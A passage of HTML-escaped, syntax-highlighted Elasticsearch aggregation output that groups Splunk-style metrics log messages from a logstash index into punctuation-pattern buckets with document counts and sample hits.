            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11417&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMLOLjo3PexoUunn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:15:29.777 +0800 INFO  Metrics - group=tpool, name=indexertpool, qsize=0, workers=2, qwork_units=0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=---,_=.,_=,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11350&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11350&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;generic&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11350&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;31.69559471365639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11350&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11350&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUukk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:02.779 +0800 INFO  Metrics - group=pipeline, name=indexerpipe, processor=syslog-output-generic-processor, cpu_seconds=0.000000, executes=104, cumulative_hits=161564&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;search_health_metrics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;51.010511562718996&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUujq&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:33.776 +0800 INFO  Metrics - group=search_health_metrics, name=bundle_directory_reaper, bundle_dir_reaper_max_ms=1, bundle_dir_reaper_mean_ms=1.000000&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=.,_=,_=,_=,_=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5849&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5849&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
